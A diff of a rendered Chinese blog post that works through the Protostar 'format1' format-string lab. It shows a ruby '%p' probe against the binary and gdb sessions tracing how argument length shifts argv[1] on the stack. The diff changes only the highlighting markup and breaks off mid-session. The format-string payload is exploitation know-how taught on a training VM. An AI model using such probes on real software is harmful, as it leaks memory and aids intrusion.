 <p>44 和 43 去哪里了呢&hellip;</p>
 <p>我们回到开头那句命令</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/opt/protostar/bin/format1 <span class="sb">`</span>ruby -e <span class="s1">&#39;puts &#34;ABCD&#34; + &#34;|%p&#34;*133 &#39;</span><span class="sb">``</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/opt/protostar/bin/format1 <span style="color:#e6db74">`</span>ruby -e <span style="color:#e6db74">&#39;puts &#34;ABCD&#34; + &#34;|%p&#34;*133 &#39;</span><span style="color:#e6db74">``</span>
 </span></span></code></pre></div><p>重新测试一下：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># pwd: /</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># %p * 133</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>0x616d726f<span class="p">|</span>0x41003174<span class="p">|</span>0x7c444342user@protostar:/$ 
-</span></span><span class="line"><span class="cl"><span class="c1"># %p * 134</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>0x317461<span class="p">|</span>0x44434241<span class="p">|</span>0x7c70257c<span class="p">|</span>0x257c7025user@protostar:/$
-</span></span><span class="line"><span class="cl"><span class="c1"># %p * 135</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>0x726f662f<span class="p">|</span>0x3174616d<span class="p">|</span>0x43424100<span class="p">|</span>0x70257c44<span class="p">|</span>0x7c70257c<span class="p">|</span>0x257c7025<span class="p">|</span>0x70257c70user@protostar:/$
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># pwd: /</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %p * 133</span>
+</span></span><span style="display:flex;"><span>|0x616d726f|0x41003174|0x7c444342user@protostar:/$ 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %p * 134</span>
+</span></span><span style="display:flex;"><span>|0x317461|0x44434241|0x7c70257c|0x257c7025user@protostar:/$
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># %p * 135</span>
+</span></span><span style="display:flex;"><span>|0x726f662f|0x3174616d|0x43424100|0x70257c44|0x7c70257c|0x257c7025|0x70257c70user@protostar:/$
 </span></span></code></pre></div><p>会发现面包屑对应的十六进制<strong>无法出现在一个 4 bytes 上</strong>，</p>
 <p>且<strong>就算出现在了一个 4 bytes 里也并不出现在最后一个<code>%p</code></strong></p>
 <p>这也就导致了那个脚本无法使用</p>
@@ -518,165 +525,165 @@ if (!doNotTrack) {
 <p>而上面那个无法对齐又不在最后一个的情况，工作目录是：<code>/</code></p>
 <p>看来大概的确是环境变量的问题，让我们开个 gdb 验证一下</p>
 <p>检视一下栈的位置：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info proc map
-</span></span><span class="line"><span class="cl">process <span class="m">7506</span>
-</span></span><span class="line"><span class="cl"><span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/format1&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/format1&#39;</span>
-</span></span><span class="line"><span class="cl">Mapped address spaces:
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">	Start Addr   End Addr       Size     Offset objfile
-</span></span><span class="line"><span class="cl">	 0x8048000  0x8049000     0x1000          <span class="m">0</span>       /opt/protostar/bin/format1
-</span></span><span class="line"><span class="cl">	 0x8049000  0x804a000     0x1000          <span class="m">0</span>       /opt/protostar/bin/format1
-</span></span><span class="line"><span class="cl">	0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
-</span></span><span class="line"><span class="cl">	0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
-</span></span><span class="line"><span class="cl">	0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
-</span></span><span class="line"><span class="cl">	0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
-</span></span><span class="line"><span class="cl">	0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-</span></span><span class="line"><span class="cl">	0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc map
+</span></span><span style="display:flex;"><span>process <span style="color:#ae81ff">7506</span>
+</span></span><span style="display:flex;"><span>cmdline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/format1&#39;</span>
+</span></span><span style="display:flex;"><span>cwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/format1&#39;</span>
+</span></span><span style="display:flex;"><span>Mapped address spaces:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Start Addr   End Addr       Size     Offset objfile
+</span></span><span style="display:flex;"><span>	 0x8048000  0x8049000     0x1000          <span style="color:#ae81ff">0</span>       /opt/protostar/bin/format1
+</span></span><span style="display:flex;"><span>	 0x8049000  0x804a000     0x1000          <span style="color:#ae81ff">0</span>       /opt/protostar/bin/format1
+</span></span><span style="display:flex;"><span>	0xb7e96000 0xb7e97000     0x1000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7e97000 0xb7fd5000   0x13e000          <span style="color:#ae81ff">0</span>         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fd9000 0xb7fdc000     0x3000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe0000 0xb7fe2000     0x2000          <span style="color:#ae81ff">0</span>        
+</span></span><span style="display:flex;"><span>	0xb7fe2000 0xb7fe3000     0x1000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	0xb7fe3000 0xb7ffe000    0x1b000          <span style="color:#ae81ff">0</span>         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+</span></span><span style="display:flex;"><span>	0xbffeb000 0xc0000000    0x15000          <span style="color:#ae81ff">0</span>           <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
 </span></span></code></pre></div><p>可以看到是从 <code>0xbffeb000</code> 到 <code>0xc0000000</code></p>
 <p>接下来找找 <code>argv[1]</code> 的地址：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble main
-</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-</span></span><span class="line"><span class="cl">0x0804841c &lt;main+0&gt;:	push   ebp
-</span></span><span class="line"><span class="cl">0x0804841d &lt;main+1&gt;:	mov    ebp,esp
-</span></span><span class="line"><span class="cl">0x0804841f &lt;main+3&gt;:	and    esp,0xfffffff0
-</span></span><span class="line"><span class="cl">0x08048422 &lt;main+6&gt;:	sub    esp,0x10
-</span></span><span class="line"><span class="cl">0x08048425 &lt;main+9&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x08048428 &lt;main+12&gt;:	add    eax,0x4
-</span></span><span class="line"><span class="cl">0x0804842b &lt;main+15&gt;:	mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x0804842d &lt;main+17&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-</span></span><span class="line"><span class="cl">0x08048430 &lt;main+20&gt;:	call   0x80483f4 &lt;vuln&gt;
-</span></span><span class="line"><span class="cl">0x08048435 &lt;main+25&gt;:	leave  
-</span></span><span class="line"><span class="cl">0x08048436 &lt;main+26&gt;:	ret    
-</span></span><span class="line"><span class="cl">End of assembler dump.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>0x0804841c &lt;main+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>0x0804841d &lt;main+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>0x0804841f &lt;main+3&gt;:	and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span>0x08048422 &lt;main+6&gt;:	sub    esp,0x10
+</span></span><span style="display:flex;"><span>0x08048425 &lt;main+9&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x08048428 &lt;main+12&gt;:	add    eax,0x4
+</span></span><span style="display:flex;"><span>0x0804842b &lt;main+15&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0804842d &lt;main+17&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x08048430 &lt;main+20&gt;:	call   0x80483f4 &lt;vuln&gt;
+</span></span><span style="display:flex;"><span>0x08048435 &lt;main+25&gt;:	leave  
+</span></span><span style="display:flex;"><span>0x08048436 &lt;main+26&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
 </span></span></code></pre></div><p>在 <code>call 0x80483f4 &lt;vuln&gt;</code> 设置断点并查看 EAX 指向的值就是 <code>argv[1]</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048430
-</span></span><span class="line"><span class="cl">Note: breakpoint <span class="m">2</span> also <span class="nb">set</span> at pc 0x8048430.
-</span></span><span class="line"><span class="cl">Breakpoint <span class="m">3</span> at 0x8048430: file format1/format1.c, line 19.
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD1234
-</span></span><span class="line"><span class="cl">Starting program: /opt/protostar/bin/format1 ABCD1234
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Breakpoint 2, 0x08048430 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>2, <span class="nv">argv</span><span class="o">=</span>0xbffff844<span class="o">)</span> at format1/format1.c:19
-</span></span><span class="line"><span class="cl">19	in format1/format1.c
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
-</span></span><span class="line"><span class="cl">eax            0xbffff987	-1073743481
-</span></span><span class="line"><span class="cl">ecx            0x4fa715d9	<span class="m">1336350169</span>
-</span></span><span class="line"><span class="cl">edx            0x2	<span class="m">2</span>
-</span></span><span class="line"><span class="cl">ebx            0xb7fd7ff4	-1208123404
-</span></span><span class="line"><span class="cl">esp            0xbffff780	0xbffff780
-</span></span><span class="line"><span class="cl">ebp            0xbffff798	0xbffff798
-</span></span><span class="line"><span class="cl">esi            0x0	<span class="m">0</span>
-</span></span><span class="line"><span class="cl">edi            0x0	<span class="m">0</span>
-</span></span><span class="line"><span class="cl">eip            0x8048430	0x8048430 &lt;main+20&gt;
-</span></span><span class="line"><span class="cl">eflags         0x200286	<span class="o">[</span> PF SF IF ID <span class="o">]</span>
-</span></span><span class="line"><span class="cl">cs             0x73	<span class="m">115</span>
-</span></span><span class="line"><span class="cl">ss             0x7b	<span class="m">123</span>
-</span></span><span class="line"><span class="cl">ds             0x7b	<span class="m">123</span>
-</span></span><span class="line"><span class="cl">es             0x7b	<span class="m">123</span>
-</span></span><span class="line"><span class="cl">fs             0x0	<span class="m">0</span>
-</span></span><span class="line"><span class="cl">gs             0x33	<span class="m">51</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *0x08048430
+</span></span><span style="display:flex;"><span>Note: breakpoint <span style="color:#ae81ff">2</span> also set at pc 0x8048430.
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">3</span> at 0x8048430: file format1/format1.c, line 19.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD1234
+</span></span><span style="display:flex;"><span>Starting program: /opt/protostar/bin/format1 ABCD1234
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Breakpoint 2, 0x08048430 in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span>2, argv<span style="color:#f92672">=</span>0xbffff844<span style="color:#f92672">)</span> at format1/format1.c:19
+</span></span><span style="display:flex;"><span>19	in format1/format1.c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers 
+</span></span><span style="display:flex;"><span>eax            0xbffff987	-1073743481
+</span></span><span style="display:flex;"><span>ecx            0x4fa715d9	<span style="color:#ae81ff">1336350169</span>
+</span></span><span style="display:flex;"><span>edx            0x2	<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>ebx            0xb7fd7ff4	-1208123404
+</span></span><span style="display:flex;"><span>esp            0xbffff780	0xbffff780
+</span></span><span style="display:flex;"><span>ebp            0xbffff798	0xbffff798
+</span></span><span style="display:flex;"><span>esi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>edi            0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>eip            0x8048430	0x8048430 &lt;main+20&gt;
+</span></span><span style="display:flex;"><span>eflags         0x200286	<span style="color:#f92672">[</span> PF SF IF ID <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>cs             0x73	<span style="color:#ae81ff">115</span>
+</span></span><span style="display:flex;"><span>ss             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>ds             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>es             0x7b	<span style="color:#ae81ff">123</span>
+</span></span><span style="display:flex;"><span>fs             0x0	<span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>gs             0x33	<span style="color:#ae81ff">51</span>
 </span></span></code></pre></div><p>可以看到 EAX 的地址是 <code>0xbffff987</code></p>
 <p>为了方便演示，我这里把 EAX 的地址 <code>0xbffff987</code> 前面的一部分内容也打印出来，就从 <code>0xbffff970</code> 开始吧</p>
 <p>使用 <code>x/20s</code> 即：<code>[Examine] / [next 20 values] [String]</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/20s 0xbffff970
-</span></span><span class="line"><span class="cl">0xbffff970:	 <span class="s2">&#34;/protostar/bin/format1&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff987:	 <span class="s2">&#34;ABCD1234&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff990:	 <span class="s2">&#34;USER=user&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff99a:	 <span class="s2">&#34;SSH_CLIENT=192.168.2.....
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/20s 0xbffff970
+</span></span><span style="display:flex;"><span>0xbffff970:	 <span style="color:#e6db74">&#34;/protostar/bin/format1&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff987:	 <span style="color:#e6db74">&#34;ABCD1234&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff990:	 <span style="color:#e6db74">&#34;USER=user&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff99a:	 <span style="color:#e6db74">&#34;SSH_CLIENT=192.168.2.....
 </span></span></span></code></pre></div><p>可以看到，<code>argv[1] = ABCD1234</code> 时，地址是 <code>0xbffff987</code></p>
 <p><code>argv[1]</code> 后面出现的那些是环境变量，我们暂时不用去管</p>
 <p>接下来试着给 <code>argv[1]</code> 增加字符&hellip;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD12345
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/20s 0xbffff970
-</span></span><span class="line"><span class="cl">0xbffff970:	 <span class="s2">&#34;protostar/bin/format1&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff986:	 <span class="s2">&#34;ABCD12345&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff990:	 <span class="s2">&#34;USER=user&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD123456
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/20s 0xbffff970
-</span></span><span class="line"><span class="cl">0xbffff970:	 <span class="s2">&#34;rotostar/bin/format1&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff985:	 <span class="s2">&#34;ABCD123456&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff990:	 <span class="s2">&#34;USER=user&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD1234567
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/20s 0xbffff970
-</span></span><span class="line"><span class="cl">0xbffff970:	 <span class="s2">&#34;otostar/bin/format1&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff984:	 <span class="s2">&#34;ABCD1234567&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff990:	 <span class="s2">&#34;USER=user&#34;</span>
-</span></span><span class="line"><span class="cl">0xbffff99a:	 <span class="s2">&#34;SSH_CL...
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD12345
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/20s 0xbffff970
+</span></span><span style="display:flex;"><span>0xbffff970:	 <span style="color:#e6db74">&#34;protostar/bin/format1&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff986:	 <span style="color:#e6db74">&#34;ABCD12345&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff990:	 <span style="color:#e6db74">&#34;USER=user&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD123456
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/20s 0xbffff970
+</span></span><span style="display:flex;"><span>0xbffff970:	 <span style="color:#e6db74">&#34;rotostar/bin/format1&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff985:	 <span style="color:#e6db74">&#34;ABCD123456&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff990:	 <span style="color:#e6db74">&#34;USER=user&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r ABCD1234567
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/20s 0xbffff970
+</span></span><span style="display:flex;"><span>0xbffff970:	 <span style="color:#e6db74">&#34;otostar/bin/format1&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff984:	 <span style="color:#e6db74">&#34;ABCD1234567&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff990:	 <span style="color:#e6db74">&#34;USER=user&#34;</span>
+</span></span><span style="display:flex;"><span>0xbffff99a:	 <span style="color:#e6db74">&#34;SSH_CL...
 </span></span></span></code></pre></div><p>可以看到随着参数的逐渐加长，<code>argv[1]</code> 的地址逐渐在减小&hellip;</p>
 <p>但是这又怎么会影响 <code>printf</code> 读到的内容呢..</p>
 <p>因为就算<code>argv[1]</code> 的地址逐渐减小，那 <code>printf</code> 的地址也会逐渐减小的啊，一次减小一个 bytes 的话，<code>printf</code> 的地址到 <code>argv[1]</code> 的地址中间的距离应该不变才对&hellip;</p>
 <h2 id="eax-ebp-buffer">EAX, EBP, Buffer</h2>
 <p>上面的设想是错的，实际上 <code>printf</code> 的地址到 <code>argv[1]</code> 的地址中间的距离确实地改变了</p>
 <p>依然用 gdb 做个实验吧，在 <code>call 0x80483f4 &lt;vuln&gt;</code> 设置断点</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> disassemble  main
-</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-</span></span><span class="line"><span class="cl">0x0804841c &lt;main+0&gt;:	push   ebp
-</span></span><span class="line"><span class="cl">0x0804841d &lt;main+1&gt;:	mov    ebp,esp
-</span></span><span class="line"><span class="cl">0x0804841f &lt;main+3&gt;:	and    esp,0xfffffff0
-</span></span><span class="line"><span class="cl">0x08048422 &lt;main+6&gt;:	sub    esp,0x10
-</span></span><span class="line"><span class="cl">0x08048425 &lt;main+9&gt;:	mov    eax,DWORD PTR <span class="o">[</span>ebp+0xc<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x08048428 &lt;main+12&gt;:	add    eax,0x4
-</span></span><span class="line"><span class="cl">0x0804842b &lt;main+15&gt;:	mov    eax,DWORD PTR <span class="o">[</span>eax<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x0804842d &lt;main+17&gt;:	mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-</span></span><span class="line"><span class="cl">0x08048430 &lt;main+20&gt;:	call   0x80483f4 &lt;vuln&gt;
-</span></span><span class="line"><span class="cl">0x08048435 &lt;main+25&gt;:	leave  
-</span></span><span class="line"><span class="cl">0x08048436 &lt;main+26&gt;:	ret    
-</span></span><span class="line"><span class="cl">End of assembler dump.
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x08048430
-</span></span><span class="line"><span class="cl">Breakpoint <span class="m">1</span> at 0x8048430: file format1/format1.c, line 19.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble  main
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>0x0804841c &lt;main+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>0x0804841d &lt;main+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>0x0804841f &lt;main+3&gt;:	and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span>0x08048422 &lt;main+6&gt;:	sub    esp,0x10
+</span></span><span style="display:flex;"><span>0x08048425 &lt;main+9&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x08048428 &lt;main+12&gt;:	add    eax,0x4
+</span></span><span style="display:flex;"><span>0x0804842b &lt;main+15&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x0804842d &lt;main+17&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+</span></span><span style="display:flex;"><span>0x08048430 &lt;main+20&gt;:	call   0x80483f4 &lt;vuln&gt;
+</span></span><span style="display:flex;"><span>0x08048435 &lt;main+25&gt;:	leave  
+</span></span><span style="display:flex;"><span>0x08048436 &lt;main+26&gt;:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *0x08048430
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x8048430: file format1/format1.c, line 19.
 </span></span></code></pre></div><p>然后改变参数的长度&hellip;</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD1234AB
-</span></span><span class="line"><span class="cl">Starting program: /opt/protostar/bin/format1 ABCD1234AB
-</span></span><span class="line"><span class="cl">Breakpoint 1, 0x08048430 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>2, <span class="nv">argv</span><span class="o">=</span>0xbffff844<span class="o">)</span> at format1/format1.c:19
-</span></span><span class="line"><span class="cl">19	in format1/format1.c
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
-</span></span><span class="line"><span class="cl">eax            0xbffff97c	-1073743492
-</span></span><span class="line"><span class="cl">ecx            0xad015181	-1392422527
-</span></span><span class="line"><span class="cl">edx            0x2	<span class="m">2</span>
-</span></span><span class="line"><span class="cl">ebx            0xb7fd7ff4	-1208123404
-</span></span><span class="line"><span class="cl">esp            0xbffff780	0xbffff780
-</span></span><span class="line"><span class="cl">ebp            0xbffff798	0xbffff798
-</span></span><span class="line"><span class="cl">esi            0x0	<span class="m">0</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD1234ABC
-</span></span><span class="line"><span class="cl">The program being debugged has been started already.
-</span></span><span class="line"><span class="cl">Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
-</span></span><span class="line"><span class="cl">Starting program: /opt/protostar/bin/format1 ABCD1234ABC
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Breakpoint 1, 0x08048430 in main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>2, <span class="nv">argv</span><span class="o">=</span>0xbffff844<span class="o">)</span> at format1/format1.c:19
-</span></span><span class="line"><span class="cl">19	in format1/format1.c
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> info registers 
-</span></span><span class="line"><span class="cl">eax            0xbffff97b	-1073743493
-</span></span><span class="line"><span class="cl">ecx            0x912d21cc	-1859313204
-</span></span><span class="line"><span class="cl">edx            0x2	<span class="m">2</span>
-</span></span><span class="line"><span class="cl">ebx            0xb7fd7ff4	-1208123404
-</span></span><span class="line"><span class="cl">esp            0xbffff780	0xbffff780
-</span></span><span class="line"><span class="cl">ebp            0xbffff798	0xbffff798
-</span></span><span class="line"><span class="cl">esi            0x0	<span class="m">0</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> r ABCD1234ABCD
